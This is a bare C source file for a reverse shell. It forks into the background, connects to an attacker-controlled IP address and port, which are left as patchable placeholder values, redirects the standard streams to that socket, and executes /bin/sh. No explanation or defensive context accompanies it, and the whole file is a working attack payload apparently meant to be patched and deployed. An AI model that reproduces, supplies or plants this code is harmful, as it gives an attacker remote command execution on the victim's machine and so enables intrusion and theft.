#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char CLIENT_IP[] = "CCCCCCCCCCCCCCCCC";
int CLIENT_PORT = 0x4141414141414141;

int main(void) {
	pid_t pid = fork();
	if (pid == -1) {
		return (-1);
	}
	if (pid > 0) {
		return (0);
	}
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(CLIENT_PORT);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (-1);
	}
	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
	return (0);
}
